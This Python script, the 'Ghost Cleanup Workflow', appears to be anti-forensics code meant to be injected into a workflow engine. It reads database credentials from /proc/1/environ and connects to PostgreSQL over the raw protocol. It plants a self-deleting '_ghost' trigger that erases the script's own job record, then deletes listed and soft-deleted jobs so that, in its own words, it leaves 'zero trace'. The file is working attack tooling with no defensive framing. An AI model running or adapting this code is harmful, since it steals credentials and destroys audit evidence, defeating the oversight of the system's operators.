"""
Ghost Cleanup Workflow - Zero Forensic Evidence Mode

Connects to PostgreSQL using raw protocol (no external dependencies) and:
1. Auto-detects connection method (Unix socket or TCP)
2. Auto-detects schema version (v2_job or queue)
3. Creates self-destruct trigger for this cleanup job
4. Deletes all tracked job IDs and soft-deleted jobs
5. Trigger removes itself after execution, leaving zero trace

Placeholders: __DB_HOST__, __DB_USER__, __DB_PASS__, __DB_NAME__, __JOB_IDS__
"""

import socket
import struct
import hashlib
import hmac
import base64
import os
import re

_DB_HOST = "__DB_HOST__"
_DB_USER = "__DB_USER__"
_DB_PASS = "__DB_PASS__"
_DB_NAME = "__DB_NAME__"
JOB_IDS = []  # __JOB_IDS__

UNIX_SOCKET_PATHS = ["/var/run/postgresql", "/tmp"]
PG_PROTOCOL_VERSION = 196608
PG_PORT = 5432
CONNECT_TIMEOUT = 3
QUERY_TIMEOUT = 10


def parse_database_url():
    url = os.environ.get("DATABASE_URL", "")
    if not url:
        try:
            with open("/proc/1/environ", "rb") as f:
                for kv in f.read().split(b"\0"):
                    if kv.startswith(b"DATABASE_URL="):
                        url = kv.split(b"=", 1)[1].decode()
                        break
        except:
            pass
    if not url or not url.startswith("postgres"):
        return _DB_HOST, _DB_USER, _DB_PASS, _DB_NAME
    try:
        from urllib.parse import urlparse, unquote
        p = urlparse(url)
        return (
            unquote(p.hostname) if p.hostname else _DB_HOST,
            unquote(p.username) if p.username else _DB_USER,
            unquote(p.password) if p.password else _DB_PASS,
            p.path.lstrip("/").split("?")[0] if p.path else _DB_NAME,
        )
    except:
        return _DB_HOST, _DB_USER, _DB_PASS, _DB_NAME


DB_HOST, DB_USER, DB_PASS, DB_NAME = parse_database_url()


def build_startup_message(user, database):
    params = f"user\x00{user}\x00database\x00{database}\x00\x00".encode()
    return struct.pack(">I", 8 + len(params)) + struct.pack(">I", PG_PROTOCOL_VERSION) + params


def wait_ready(sock):
    data = b""
    while b"Z" not in data:
        data += sock.recv(4096)
    return data


def send_query(sock, query):
    query_bytes = query.encode() if isinstance(query, str) else query
    msg = b"Q" + struct.pack(">I", len(query_bytes) + 5) + query_bytes + b"\x00"
    sock.send(msg)
    return wait_ready(sock)


def scram_sha256_auth(sock, user, password):
    nonce = base64.b64encode(os.urandom(18)).decode()
    client_first_bare = f"n={user},r={nonce}"
    client_first = f"n,,{client_first_bare}"
    
    data = b"SCRAM-SHA-256\x00" + struct.pack(">I", len(client_first)) + client_first.encode()
    sock.send(b"p" + struct.pack(">I", len(data) + 4) + data)
    
    resp = sock.recv(1024)
    server_first = resp[9 : struct.unpack(">I", resp[1:5])[0] + 1].decode(errors="ignore")
    params = dict(x.split("=", 1) for x in server_first.split(",") if "=" in x)
    
    salt = base64.b64decode(params["s"])
    iterations = int(params["i"])
    salted_password = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, iterations)
    
    client_key = hmac.new(salted_password, b"Client Key", "sha256").digest()
    stored_key = hashlib.sha256(client_key).digest()
    client_final_without_proof = f"c=biws,r={params['r']}"
    auth_message = f"{client_first_bare},{server_first},{client_final_without_proof}"
    client_signature = hmac.new(stored_key, auth_message.encode(), "sha256").digest()
    client_proof = bytes(a ^ b for a, b in zip(client_key, client_signature))
    
    client_final = f"{client_final_without_proof},p={base64.b64encode(client_proof).decode()}"
    sock.send(b"p" + struct.pack(">I", len(client_final) + 4) + client_final.encode())
    wait_ready(sock)


def connect_unix(sock_dir, user, database):
    sock_path = f"{sock_dir}/.s.PGSQL.{PG_PORT}"
    if not os.path.exists(sock_path):
        return None
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(CONNECT_TIMEOUT)
        sock.connect(sock_path)
        sock.send(build_startup_message(user, database))
        sock.recv(1024)
        sock.settimeout(QUERY_TIMEOUT)
        return sock
    except:
        return None


def connect_tcp(host, user, password, database):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(QUERY_TIMEOUT)
    sock.connect((host, PG_PORT))
    sock.send(build_startup_message(user, database))
    resp = sock.recv(1024)
    if b"SCRAM-SHA-256" in resp or resp[0:1] == b"R":
        scram_sha256_auth(sock, user, password)
    return sock


def connect():
    for sock_dir in UNIX_SOCKET_PATHS:
        sock = connect_unix(sock_dir, DB_USER, DB_NAME)
        if sock:
            return sock
    return connect_tcp(DB_HOST, DB_USER, DB_PASS, DB_NAME)


def detect_schema(sock):
    result = send_query(sock, "SELECT EXISTS (SELECT 1 FROM information_schema.tables WHERE table_name='v2_job')")
    is_v2 = b"\x00\x00\x00\x01t" in result
    if is_v2:
        return "v2_job", "v2_job_completed"
    return "queue", "completed_job"


def create_self_destruct_trigger(sock, job_id, tbl_job, tbl_completed):
    send_query(sock, f"DROP TRIGGER IF EXISTS _ghost ON {tbl_completed}")
    send_query(sock, "DROP FUNCTION IF EXISTS _ghost_fn()")
    send_query(sock, f"""
        CREATE FUNCTION _ghost_fn() RETURNS TRIGGER AS $$ BEGIN
            IF NEW.id::text = '{job_id}' THEN
                DELETE FROM {tbl_completed} WHERE id = NEW.id;
                DELETE FROM {tbl_job} WHERE id = NEW.id;
                EXECUTE 'DROP TRIGGER IF EXISTS _ghost ON {tbl_completed}';
                EXECUTE 'DROP FUNCTION IF EXISTS _ghost_fn()';
            END IF;
            RETURN NEW;
        END; $$ LANGUAGE plpgsql
    """)
    send_query(sock, f"CREATE TRIGGER _ghost AFTER INSERT ON {tbl_completed} FOR EACH ROW EXECUTE FUNCTION _ghost_fn()")


def delete_jobs_by_ids(sock, job_ids, tbl_job, tbl_completed):
    if not job_ids:
        return 0
    ids_str = ",".join(f"'{jid}'" for jid in job_ids)
    send_query(sock, f"DELETE FROM {tbl_job} WHERE id IN ({ids_str})")
    result = send_query(sock, f"DELETE FROM {tbl_completed} WHERE id IN ({ids_str})")
    match = re.search(rb"DELETE (\d+)", result)
    return int(match.group(1)) if match else 0


def delete_soft_deleted_jobs(sock, tbl_job, tbl_completed):
    send_query(sock, f"DELETE FROM {tbl_job} WHERE id IN (SELECT id FROM {tbl_completed} WHERE deleted=true)")
    result = send_query(sock, f"DELETE FROM {tbl_completed} WHERE deleted=true")
    match = re.search(rb"DELETE (\d+)", result)
    return int(match.group(1)) if match else 0


def main():
    sock = connect()
    tbl_job, tbl_completed = detect_schema(sock)
    
    my_job_id = os.environ.get("WM_JOB_ID", "")
    if my_job_id:
        create_self_destruct_trigger(sock, my_job_id, tbl_job, tbl_completed)
    
    deleted = delete_jobs_by_ids(sock, JOB_IDS, tbl_job, tbl_completed)
    deleted += delete_soft_deleted_jobs(sock, tbl_job, tbl_completed)
    
    sock.close()
    return deleted
